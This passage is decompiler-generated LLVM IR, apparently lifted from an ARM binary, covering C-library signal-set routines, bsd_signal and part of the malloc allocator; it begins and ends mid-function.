  %v0_10818 = load i32, i32* %r2.global-to-local, align 4
  %v1_10818 = sub i32 0, %v0_10818
  store i32 %v1_10818, i32* %r2.global-to-local, align 4
  %v3_1081c = add i32 %v4_10814, %v0_10810
  %v4_1081c = inttoptr i32 %v3_1081c to i32*
  store i32 %v1_10818, i32* %v4_1081c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10824.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %entry, %dec_label_pc_1080c
  %v1_10828 = phi i32 [ %v0_107fc, %entry ], [ -1, %dec_label_pc_1080c ]
  %v2_10824 = phi i32 [ %v3_107f0, %entry ], [ %v2_10824.pre, %dec_label_pc_1080c ]
  store i32 %v2_10824, i32* @r7, align 4
  ret i32 %v1_10828

; uselistorder directives
  uselistorder i32 %v0_107fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10824, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1082c:
  %v0_1082c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1082c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1082c
  %v2_1082c = load i32, i32* @sb, align 4
  %v8_1082c = shl i32 %v2_1082c, %arg2
  %v9_1082c = and i32 %v8_1082c, %arg1
  %v3_10830 = load i32, i32* @r5, align 4
  %v8_10830 = ashr i32 %v9_1082c, %v3_10830
  %v9_10830 = and i32 %v8_10830, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1082c, %bb
  %v10_10830 = phi i32 [ %arg1, %dec_label_pc_1082c ], [ %v9_10830, %bb ]
  ret i32 %v10_10830

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_1084c, label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %entry
  %v7_10848 = icmp slt i32 %arg2, 65
  br i1 %v7_10848, label %dec_label_pc_10868, label %dec_label_pc_1084c

dec_label_pc_1084c:                               ; preds = %dec_label_pc_10844, %entry
  %v0_10850 = call i32 @__aeabi_read_tp()
  %v3_10854 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10854 = sext i16 %v3_10854 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_10860 = add i32 %v4_10854, %v0_10850
  %v4_10860 = inttoptr i32 %v3_10860 to i32*
  store i32 22, i32* %v4_10860, align 4
  %v0_10870.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10870

dec_label_pc_10868:                               ; preds = %dec_label_pc_10844
  %v0_10868 = call i32 @__sigaddset()
  store i32 %v0_10868, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %dec_label_pc_1084c, %dec_label_pc_10868
  %v0_10870 = phi i32 [ %v0_10870.pre, %dec_label_pc_1084c ], [ %v0_10868, %dec_label_pc_10868 ]
  ret i32 %v0_10870

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10870, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1088c = add i32 %tmp, 4
  %v3_1088c = inttoptr i32 %v2_1088c to i32*
  store i32 0, i32* %v3_1088c, align 4
  %v1_10890 = load i32, i32* %r3.global-to-local, align 4
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  store i32 0, i32* %v2_10890, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10898 = load i32, i32* @r4, align 4
  store i32 %v3_10898, i32* %stack_var_-16, align 4
  %v6_10898 = load i32, i32* @r5, align 4
  %v9_10898 = load i32, i32* @r6, align 4
  %v7_108a0 = icmp eq i32 %arg2, -1
  br i1 %v7_108a0, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_108a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_108c4

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_108cc

dec_label_pc_108c4:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r6, align 4
  %v7_108c8 = icmp slt i32 %arg1, 65
  br i1 %v7_108c8, label %dec_label_pc_108e8, label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %.thread16, %dec_label_pc_108c4
  %v0_108d0 = call i32 @__aeabi_read_tp()
  %v3_108d4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_108d4 = sext i16 %v3_108d4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_108e0 = add i32 %v4_108d4, %v0_108d0
  %v4_108e0 = inttoptr i32 %v3_108e0 to i32*
  store i32 22, i32* %v4_108e0, align 4
  %v0_10940.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_108e8:                               ; preds = %dec_label_pc_108c4
  %v2_108e8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_108e8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_108f0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_108f0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_10900 = call i32 @__sigaddset()
  %v0_10908 = load i32, i32* @r5, align 4
  store i32 %v0_10908, i32* %r1.global-to-local, align 4
  %v0_1090c = load i32, i32* @r6, align 4
  %v2_1090c = add i32 %v0_1090c, 11924
  %v2_10910 = call i32 @__GI___sigismember(i32 %v2_1090c, i32 %v0_10908)
  store i32 %v2_108e8, i32* %r1.global-to-local, align 4
  %v0_10924 = load i32, i32* @r5, align 4
  %v3_10930 = call i32 @__libc_sigaction(i32 %v0_10924, i32 %v2_108e8, i32 %v2_108a8)
  %v1_10934 = icmp slt i32 %v3_10930, 0
  br i1 %v1_10934, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_108e8
  %v5_10938 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_10938, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_108e8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_108cc, %bb32
  %v0_10940 = phi i32 [ %v5_10938, %bb31 ], [ %v0_10940.pre, %dec_label_pc_108cc ], [ -1, %bb32 ]
  %v2_10948 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10948, i32* @r4, align 4
  store i32 %v6_10898, i32* @r5, align 4
  store i32 %v9_10898, i32* @r6, align 4
  ret i32 %v0_10940

; uselistorder directives
  uselistorder i32 %v2_108e8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108cc, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1095c = add i32 %arg2, -1
  %v3_10960 = udiv i32 %v1_1095c, 32
  %v4_10964 = mul nuw nsw i32 %v3_10960, 4
  %v5_10964 = add i32 %v4_10964, %arg1
  %v6_10964 = inttoptr i32 %v5_10964 to i32*
  %v7_10964 = load i32, i32* %v6_10964, align 4
  %v1_10968 = urem i32 %v1_1095c, 32
  %v7_10970 = shl i32 1, %v1_10968
  %v8_10970 = and i32 %v7_10964, %v7_10970
  %v10_10970 = icmp ne i32 %v8_10970, 0
  %. = zext i1 %v10_10970 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1095c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_10980 = load i32, i32* @r1, align 4
  %v1_10980 = add i32 %v0_10980, -1
  %v3_10984 = udiv i32 %v1_10980, 32
  %v0_10988 = load i32, i32* @r0, align 4
  %v4_10988 = mul nuw nsw i32 %v3_10984, 4
  %v5_10988 = add i32 %v0_10988, %v4_10988
  %v6_10988 = inttoptr i32 %v5_10988 to i32*
  %v7_10988 = load i32, i32* %v6_10988, align 4
  %v1_1098c = urem i32 %v1_10980, 32
  %v7_10994 = shl i32 1, %v1_1098c
  %v8_10994 = or i32 %v7_10988, %v7_10994
  store i32 %v8_10994, i32* %v6_10988, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10980, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_109a4 = add i32 %arg2, -1
  %v3_109a8 = udiv i32 %v1_109a4, 32
  %v4_109ac = mul nuw nsw i32 %v3_109a8, 4
  %v5_109ac = add i32 %v4_109ac, %arg1
  %v6_109ac = inttoptr i32 %v5_109ac to i32*
  %v7_109ac = load i32, i32* %v6_109ac, align 4
  %v1_109b0 = urem i32 %v1_109a4, 32
  %tmp = shl i32 -1, %v1_109b0
  %v8_109b8 = add i32 %tmp, -1
  %v9_109b8 = and i32 %v7_109ac, %v8_109b8
  store i32 %v9_109b8, i32* %v6_109ac, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_109a4, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_109c8 = udiv i32 %arg1, 256
  store i32 %v3_109c8, i32* %r1.global-to-local, align 4
  %v2_109cc = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_109cc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_109d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_109cc, i32 %v0_109d8)
  %v0_109dc = load i32, i32* %r1.global-to-local, align 4
  %v1_109dc = add i32 %v0_109dc, 1048320
  %v3_109e0 = udiv i32 %v1_109dc, 65536
  %v1_109e4 = and i32 %v3_109e0, 8
  %v6_109e8 = shl i32 %v0_109dc, %v1_109e4
  %v1_109ec = add i32 %v6_109e8, 520192
  %v3_109f0 = udiv i32 %v1_109ec, 65536
  %v1_109f4 = and i32 %v3_109f0, 4
  %v6_109f8 = shl i32 %v6_109e8, %v1_109f4
  %v1_109fc = add i32 %v6_109f8, 245760
  %v3_10a00 = udiv i32 %v1_109fc, 65536
  %v1_10a04 = and i32 %v3_10a00, 2
  %v6_10a08 = shl i32 %v6_109f8, %v1_10a04
  store i32 %v6_10a08, i32* %r1.global-to-local, align 4
  %v1_10a0c = sub nsw i32 13, %v1_109e4
  %v2_10a10 = sub nsw i32 %v1_10a0c, %v1_109f4
  %v3_10a14 = udiv i32 %v6_10a08, 32768
  %v4_10a14 = sub nuw nsw i32 -1, %v3_10a14
  %v4_10a18 = udiv i32 %v6_10a08, 16384
  %v5_10a18 = and i32 %v4_10a18, %v4_10a14
  %v2_10a1c = sub nsw i32 %v2_10a10, %v1_10a04
  %v2_10a20 = add nsw i32 %v2_10a1c, %v5_10a18
  %v1_10a24 = add nsw i32 %v2_10a20, 6
  %v0_10a28 = load i32, i32* %ip.global-to-local, align 4
  %v6_10a28 = lshr i32 %v0_10a28, %v1_10a24
  %v3_10a2c = mul nsw i32 %v2_10a20, 4
  %v1_10a30 = add nsw i32 %v3_10a2c, 32
  %v1_10a34 = urem i32 %v6_10a28, 4
  %v2_10a38 = or i32 %v1_10a34, %v1_10a30
  ret i32 %v2_10a38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10a40 = load i32, i32* @r4, align 4
  %v6_10a40 = load i32, i32* @r5, align 4
  %v9_10a40 = load i32, i32* @r6, align 4
  %v12_10a40 = load i32, i32* @r7, align 4
  %v15_10a40 = load i32, i32* @r8, align 4
  %v18_10a40 = load i32, i32* @sb, align 4
  %v21_10a40 = load i32, i32* @sl, align 4
  %v24_10a40 = load i32, i32* @fp, align 4
  %v27_10a40 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_10a54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 108) to i32*), align 4
  store i32 %v4_10a54, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_10a60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 68) to i32*), align 4
  store i32 %v4_10a60, i32* %r1.global-to-local, align 4
  %v0_10a64 = load i32, i32* @r0, align 4
  store i32 %v0_10a64, i32* @r5, align 4
  store i32 %v4_10a54, i32* %r2.global-to-local, align 4
  %v2_10a6c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10a6c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  %v4_10a78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  store i32 %v4_10a78, i32* %ip.global-to-local, align 4
  store i32 68228, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10a78)
  %v0_10a84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a84, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r1, align 4
  %v4_10a90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 16) to i32*), align 4
  store i32 %v4_10a90, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_10a9c.655 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10a90)
  %v0_10a9c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_10a9c, -32
  br i1 %tmp, label %dec_label_pc_10ac0, label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_102b8.657 to i32), i32* %r2.global-to-local, align 4
  %v0_10aa8 = call i32 @__aeabi_read_tp()
  store i32 %v0_10aa8, i32* %r0.global-to-local, align 4
  %v3_10aac = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10aac = sext i16 %v3_10aac to i32
  store i32 %v4_10aac, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10ab8 = add i32 %v4_10aac, %v0_10aa8
  %v4_10ab8 = inttoptr i32 %v3_10ab8 to i32*
  store i32 12, i32* %v4_10ab8, align 4
  br label %dec_label_pc_11344

dec_label_pc_10ac0:                               ; preds = %entry
  %v1_10ac0 = add i32 %v0_10a9c, 11
  store i32 %v1_10ac0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v2_10acc = icmp ugt i32 %v1_10ac0, 14
  %v7_10acc = icmp eq i32 %v1_10ac0, 15
  %v2_10ad0 = xor i1 %v7_10acc, true
  %v3_10ad0 = and i1 %v2_10acc, %v2_10ad0
  br i1 %v3_10ad0, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_10ac0
  %v5_10ad0 = and i32 %v1_10ac0, -8
  store i32 %v5_10ad0, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_10ac0, %bb
  %v4_10ad4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10ad4, i32* @r0, align 4
  %v1_10ad8 = inttoptr i32 %v4_10ad4 to i32*
  %v2_10ad8 = load i32, i32* %v1_10ad8, align 4
  store i32 %v2_10ad8, i32* @r4, align 4
  %v2_10adc = xor i1 %v2_10acc, true
  %v3_10adc = or i1 %v7_10acc, %v2_10adc
  br i1 %v3_10adc, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_10ae0 = urem i32 %v2_10ad8, 2
  %v2_10ae0 = icmp eq i32 %v1_10ae0, 0
  br i1 %v2_10ae0, label %dec_label_pc_10ae8, label %dec_label_pc_10af8

dec_label_pc_10ae8:                               ; preds = %bb143
  %v2_10ae8 = icmp eq i32 %v2_10ad8, 0
  br i1 %v2_10ae8, label %dec_label_pc_10af0, label %dec_label_pc_10ed4

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10ae8
  %v0_10af0 = call i32 @__malloc_consolidate()
  store i32 %v0_10af0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ed4

dec_label_pc_10af8:                               ; preds = %bb143
  %v0_10af8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_10af8, %v2_10ad8
  br i1 %tmp204, label %dec_label_pc_10b20, label %dec_label_pc_10b00

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10af8
  %v1_10b00 = add i32 %v4_10ad4, -4
  store i32 %v1_10b00, i32* %r1.global-to-local, align 4
  %v3_10b04 = udiv i32 %v0_10af8, 8
  store i32 %v3_10b04, i32* %r2.global-to-local, align 4
  %v4_10b08 = mul nuw i32 %v3_10b04, 4
  %v5_10b08 = add i32 %v4_10b08, %v1_10b00
  %v6_10b08 = inttoptr i32 %v5_10b08 to i32*
  %v7_10b08 = load i32, i32* %v6_10b08, align 4
  store i32 %v7_10b08, i32* %r0.global-to-local, align 4
  %v2_10b0c = icmp eq i32 %v7_10b08, 0
  br i1 %v2_10b0c, label %dec_label_pc_10b20, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10b00
  %v2_10b10 = add i32 %v7_10b08, 8
  %v3_10b10 = inttoptr i32 %v2_10b10 to i32*
  %v4_10b10 = load i32, i32* %v3_10b10, align 4
  store i32 %v4_10b10, i32* %r3.global-to-local, align 4
  store i32 %v2_10b10, i32* %r0.global-to-local, align 4
  store i32 %v2_10b10, i32* %r4.global-to-local, align 4
  store i32 %v4_10b10, i32* %v6_10b08, align 4
  br label %dec_label_pc_11328

dec_label_pc_10b20:                               ; preds = %dec_label_pc_10b00, %dec_label_pc_10af8
  %tmp205 = icmp ugt i32 %v0_10af8, 255
  br i1 %tmp205, label %dec_label_pc_10b70, label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10b20
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10b30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  %v3_10b34 = udiv i32 %v0_10af8, 8
  store i32 %v3_10b34, i32* @r7, align 4
  %v4_10b38 = mul nuw i32 %v3_10b34, 8
  %v5_10b38 = add i32 %v4_10b30, %v4_10b38
  store i32 %v5_10b38, i32* %r3.global-to-local, align 4
  %v1_10b3c = add i32 %v5_10b38, 44
  store i32 %v1_10b3c, i32* %ip.global-to-local, align 4
  %v1_10b40 = add i32 %v5_10b38, 56
  %v2_10b40 = inttoptr i32 %v1_10b40 to i32*
  %v3_10b40 = load i32, i32* %v2_10b40, align 4
  store i32 %v3_10b40, i32* %r0.global-to-local, align 4
  %v9_10b44 = icmp eq i32 %v3_10b40, %v1_10b3c
  br i1 %v9_10b44, label %dec_label_pc_10cd0, label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b28
  %v2_10b4c = add i32 %v3_10b40, %v0_10af8
  store i32 %v2_10b4c, i32* %r3.global-to-local, align 4
  %v1_10b50 = add i32 %v2_10b4c, 4
  %v2_10b50 = inttoptr i32 %v1_10b50 to i32*
  %v3_10b50 = load i32, i32* %v2_10b50, align 4
  store i32 %v3_10b50, i32* %r2.global-to-local, align 4
  %v1_10b54 = add i32 %v3_10b40, 12
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  store i32 %v3_10b54, i32* %r1.global-to-local, align 4
  %v1_10b58 = or i32 %v3_10b50, 1
  store i32 %v1_10b58, i32* %r2.global-to-local, align 4
  %v1_10b5c = add i32 %v3_10b40, 8
  store i32 %v1_10b5c, i32* %r4.global-to-local, align 4
  store i32 %v1_10b58, i32* %v2_10b50, align 4
  %v0_10b64 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b64 = load i32, i32* %r1.global-to-local, align 4
  %v2_10b64 = add i32 %v1_10b64, 8
  %v3_10b64 = inttoptr i32 %v2_10b64 to i32*
  store i32 %v0_10b64, i32* %v3_10b64, align 4
  %v0_10b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b68 = load i32, i32* %ip.global-to-local, align 4
  %v2_10b68 = add i32 %v1_10b68, 12
  %v3_10b68 = inttoptr i32 %v2_10b68 to i32*
  store i32 %v0_10b68, i32* %v3_10b68, align 4
  br label %dec_label_pc_11328

dec_label_pc_10b70:                               ; preds = %dec_label_pc_10b20
  store i32 %v0_10af8, i32* %r0.global-to-local, align 4
  %v1_10b74 = call i32 @__malloc_largebin_index(i32 %v0_10af8)
  store i32 %v1_10b74, i32* %r0.global-to-local, align 4
  %v0_10b78 = load i32, i32* @r4, align 4
  %v1_10b78 = and i32 %v0_10b78, 2
  %v2_10b78 = icmp eq i32 %v1_10b78, 0
  store i32 %v1_10b74, i32* @r7, align 4
  br i1 %v2_10b78, label %dec_label_pc_10cd0, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b70
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_10b8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10b8c, i32* @r0, align 4
  %v0_10b90 = call i32 @__malloc_consolidate()
  store i32 %v0_10b90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10ce4
  %v1_10b98 = add i32 %v3_10ce4, 4
  %v2_10b98 = inttoptr i32 %v1_10b98 to i32*
  %v3_10b98 = load i32, i32* %v2_10b98, align 4
  store i32 %v3_10b98, i32* %r3.global-to-local, align 4
  %v0_10b9c = load i32, i32* @sl, align 4
  %v1_10ba0 = and i32 %v3_10b98, -4
  store i32 %v1_10ba0, i32* %r4.global-to-local, align 4
  %v1_10ba4 = add i32 %v3_10ce4, 12
  %v2_10ba4 = inttoptr i32 %v1_10ba4 to i32*
  %v3_10ba4 = load i32, i32* %v2_10ba4, align 4
  store i32 %v3_10ba4, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_10b9c, 255
  br i1 %tmp206, label %dec_label_pc_10c00, label %dec_label_pc_10bac

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b98
  %v9_10bac = icmp eq i32 %v3_10ba4, %v0_10c04
  br i1 %v9_10bac, label %dec_label_pc_10bb4, label %dec_label_pc_10c00

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10bac
  %v0_10bb4 = load i32, i32* @sb, align 4
  %v1_10bb4 = add i32 %v0_10bb4, 48
  %v2_10bb4 = inttoptr i32 %v1_10bb4 to i32*
  %v3_10bb4 = load i32, i32* %v2_10bb4, align 4
  store i32 %v3_10bb4, i32* %r3.global-to-local, align 4
  %v9_10bb8 = icmp eq i32 %v3_10ce4, %v3_10bb4
  br i1 %v9_10bb8, label %dec_label_pc_10bc0, label %dec_label_pc_10c00

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10bb4
  %v1_10bc0 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_10ba0, %v1_10bc0
  br i1 %tmp207, label %dec_label_pc_10bc8, label %dec_label_pc_10c00

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bc0
  %v2_10bc8 = sub i32 %v1_10ba0, %v0_10b9c
  store i32 %v2_10bc8, i32* %r2.global-to-local, align 4
  %v2_10bcc = add i32 %v0_10b9c, %v3_10ce4
  store i32 %v2_10bcc, i32* %r3.global-to-local, align 4
  %v1_10bd0 = or i32 %v0_10b9c, 1
  store i32 %v1_10bd0, i32* %r0.global-to-local, align 4
  %v1_10bd4 = or i32 %v2_10bc8, 1
  store i32 %v1_10bd4, i32* %r1.global-to-local, align 4
  %v1_10bd8 = add i32 %v3_10ce4, 8
  store i32 %v1_10bd8, i32* %r4.global-to-local, align 4
  %v2_10bdc = add i32 %v0_10c04, 8
  %v3_10bdc = inttoptr i32 %v2_10bdc to i32*
  store i32 %v2_10bcc, i32* %v3_10bdc, align 4
  %v0_10be0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10be0 = load i32, i32* %ip.global-to-local, align 4
  %v2_10be0 = add i32 %v1_10be0, 12
  %v3_10be0 = inttoptr i32 %v2_10be0 to i32*
  store i32 %v0_10be0, i32* %v3_10be0, align 4
  %v0_10be4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10be4 = load i32, i32* @r6, align 4
  %v2_10be4 = add i32 %v1_10be4, 4
  %v3_10be4 = inttoptr i32 %v2_10be4 to i32*
  store i32 %v0_10be4, i32* %v3_10be4, align 4
  %v0_10be8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10be8 = load i32, i32* @sb, align 4
  %v2_10be8 = add i32 %v1_10be8, 48
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  store i32 %v0_10be8, i32* %v3_10be8, align 4
  %v0_10bec = load i32, i32* %r2.global-to-local, align 4
  %v1_10bec = load i32, i32* %r3.global-to-local, align 4
  %v3_10bec = add i32 %v1_10bec, %v0_10bec
  %v4_10bec = inttoptr i32 %v3_10bec to i32*
  store i32 %v0_10bec, i32* %v4_10bec, align 4
  %v0_10bf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_10bf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf0 = add i32 %v1_10bf0, 4
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  store i32 %v0_10bf0, i32* %v3_10bf0, align 4
  %v0_10bf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_10bf4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 12
  %v3_10bf4 = inttoptr i32 %v2_10bf4 to i32*
  store i32 %v0_10bf4, i32* %v3_10bf4, align 4
  %v0_10bf8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10bf8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf8 = add i32 %v1_10bf8, 8
  %v3_10bf8 = inttoptr i32 %v2_10bf8 to i32*
  store i32 %v0_10bf8, i32* %v3_10bf8, align 4
  br label %dec_label_pc_11328

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bc0, %dec_label_pc_10bb4, %dec_label_pc_10bac, %dec_label_pc_10b98
  %v9_10c00 = icmp eq i32 %v1_10ba0, %v0_10b9c
  %v2_10c04 = add i32 %v3_10ba4, 8
  %v3_10c04 = inttoptr i32 %v2_10c04 to i32*
  store i32 %v0_10c04, i32* %v3_10c04, align 4
  %v0_10c08 = load i32, i32* %ip.global-to-local, align 4
  %v1_10c08 = load i32, i32* %r5.global-to-local, align 4
  %v2_10c08 = add i32 %v1_10c08, 12
  %v3_10c08 = inttoptr i32 %v2_10c08 to i32*
  store i32 %v0_10c08, i32* %v3_10c08, align 4
  br i1 %v9_10c00, label %dec_label_pc_10d60.loopexit, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c00
  %v0_10c1c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_10c1c, 255
